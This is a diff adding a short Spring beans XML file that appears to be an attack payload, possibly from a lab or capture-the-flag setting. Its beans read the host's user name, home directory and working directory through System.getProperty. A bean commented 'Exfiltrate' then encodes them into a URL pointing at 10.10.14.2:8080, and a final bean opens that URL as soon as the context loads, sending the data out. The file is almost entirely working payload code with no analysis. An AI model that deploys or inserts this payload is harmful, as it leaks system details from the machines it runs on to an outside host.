@@ -1,0 +1,36 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans
+       http://www.springframework.org/schema/beans/spring-beans.xsd">
+
+    <!-- Get system properties to identify service account context -->
+    <bean id="sysUser" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
+        <property name="targetClass" value="java.lang.System"/>
+        <property name="targetMethod" value="getProperty"/>
+        <property name="arguments">
+            <list><value>user.name</value></list>
+        </property>
+    </bean>
+    <bean id="sysHome" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
+        <property name="targetClass" value="java.lang.System"/>
+        <property name="targetMethod" value="getProperty"/>
+        <property name="arguments">
+            <list><value>user.home</value></list>
+        </property>
+    </bean>
+    <bean id="sysDir" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
+        <property name="targetClass" value="java.lang.System"/>
+        <property name="targetMethod" value="getProperty"/>
+        <property name="arguments">
+            <list><value>user.dir</value></list>
+        </property>
+    </bean>
+
+    <!-- Exfiltrate -->
+    <bean id="probeUrl" class="java.net.URL" depends-on="sysUser,sysHome,sysDir">
+        <constructor-arg value="#{'http://10.10.14.2:8080/probe?u=' + T(java.net.URLEncoder).encode(''+@sysUser,'UTF-8') + '&amp;h=' + T(java.net.URLEncoder).encode(''+@sysHome,'UTF-8') + '&amp;d=' + T(java.net.URLEncoder).encode(''+@sysDir,'UTF-8')}"/>
+    </bean>
+    <bean id="probeReq" factory-bean="probeUrl" factory-method="openStream" depends-on="probeUrl"/>
+
+</beans>
